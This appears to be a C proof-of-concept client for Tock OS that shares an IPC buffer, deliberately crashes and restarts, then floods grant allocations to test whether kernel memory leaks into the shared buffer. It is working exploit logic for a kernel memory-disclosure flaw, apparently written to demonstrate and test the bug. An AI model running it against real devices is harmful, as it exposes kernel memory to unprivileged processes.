#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include <libtock-sync/services/alarm.h>
#include <libtock/interface/button.h>
#include <libtock/kernel/ipc.h>
#include <libtock/tock.h>

// Use a large buffer near the top of process memory
#define BUFFER_SIZE 256

// This buffer is explicitly placed near the top of memory to increase the
// chance that after a restart, grants will overlap with it
static char shared_buffer[BUFFER_SIZE] __attribute__((section(".data")))
__attribute__((aligned(16)));
static size_t server_svc = 0;

// Global flag to detect button presses
static bool button_pressed = false;
static int pressed_button = 0;

// Restart counter (will reset on crash)
static volatile int restart_count = 0;

// Force allocation of many grants to trigger the vulnerability
static void allocate_many_grants(void) {
  printf("Client: Allocating many grants to trigger vulnerability...\n");

  // Make many IPC service discoveries and registrations to force grant
  // allocations
  for (int i = 0; i < 30; i++) {
    // These calls will allocate grant regions even if they fail
    ipc_register_client_callback(i + 100, NULL, NULL);
  }

  printf("Client: Completed grant allocations\n");
}

// Fill the buffer with a recognizable pattern
static void initialize_buffer() {
  // Clear buffer
  memset(shared_buffer, 0, BUFFER_SIZE);

  // Fill with a recognizable pattern
  for (int i = 0; i < BUFFER_SIZE - 12; i += 12) {
    snprintf(&shared_buffer[i], 12, "CLIENT-DATA");
  }

  // First byte is reserved for command
  shared_buffer[0] = 0;

  printf("Client: Buffer initialized with pattern at %p\n", shared_buffer);
}

// IPC callback for responses from the server
static void server_callback(__attribute__((unused)) int pid,
                            __attribute__((unused)) int len,
                            __attribute__((unused)) int arg2,
                            __attribute__((unused)) void *ud) {
  printf("Client: Received response from server\n");
}

// Button press callback
static void button_callback(__attribute__((unused)) returncode_t ret, int num,
                            bool val) {
  if (val) { // Button pressed
    pressed_button = num;
    button_pressed = true;
  }
}

// Function to trigger a crash
static void trigger_crash(void) {
  printf("Client: Triggering crash by division by zero...\n");
  printf(
      "Client: After restart, check if the high water mark was preserved.\n");
  printf("Client: If vulnerability exists, server will detect kernel memory in "
         "the buffer.\n");

  // Force a crash by division by zero
  volatile int x = 1;
  volatile int y = 0;
  volatile int z = x / y; // This will crash

  // This should never execute
  printf("Result: %d\n", z);
}

int main(void) {
  printf("\nVulnerability Demo Client (Restart count: %d)\n", restart_count);
  restart_count++; // Increment restart count - will reset if process crashes

  // Initialize buffer with recognizable pattern
  initialize_buffer();

  // Setup button handlers
  libtock_button_notify_on_press(0, button_callback);
  libtock_button_notify_on_press(1, button_callback);

  printf("Client: Discovering server service...\n");

  // Discover the server service
  int retry = 0;
  int err = -1;
  while (err < 0 && retry < 30) {
    err = ipc_discover("server", &server_svc);
    if (err < 0) {
      libtocksync_alarm_delay_ms(200);
      retry++;
    }
  }

  if (err < 0) {
    printf("Client: Failed to discover server service after %d retries\n",
           retry);
    return -1;
  }

  printf("Client: Found server at service %d\n", server_svc);

  // Register callback for server responses
  ipc_register_client_callback(server_svc, server_callback, NULL);

  // Share buffer with server
  printf("Client: Sharing buffer at %p with server\n", shared_buffer);
  ipc_share(server_svc, shared_buffer, BUFFER_SIZE);

  // Register buffer with server (command 0)
  shared_buffer[0] = 0;
  ipc_notify_service(server_svc);

  printf("Client: Setup complete\n");

  // Important: If this is a restart, allocate many grants to trigger
  // vulnerability
  if (restart_count > 1) {
    printf("Client: Process has been restarted after crash\n");
    allocate_many_grants();

    // Tell server to examine buffer after many grants allocated
    printf("Client: Requesting server to examine buffer after restart...\n");
    shared_buffer[0] = 1; // Command 1: Examine buffer
    ipc_notify_service(server_svc);
  }

  printf("Client: Press buttons to interact:\n");
  printf("  Button 0: Tell server to examine the buffer\n");
  printf("  Button 1: Trigger crash/restart to test vulnerability\n");

  // Main loop
  while (1) {
    // Wait for button press
    button_pressed = false;
    yield_for(&button_pressed);

    if (pressed_button == 0) {
      // Button 0: Tell server to read buffer
      printf("Client: Requesting server to examine buffer...\n");
      shared_buffer[0] = 1; // Command 1: Examine buffer
      ipc_notify_service(server_svc);
    } else if (pressed_button == 1) {
      // Button 1: Trigger crash
      trigger_crash();
    }

    // Add delay to prevent button bounce
    libtocksync_alarm_delay_ms(200);
  }

  return 0;
}
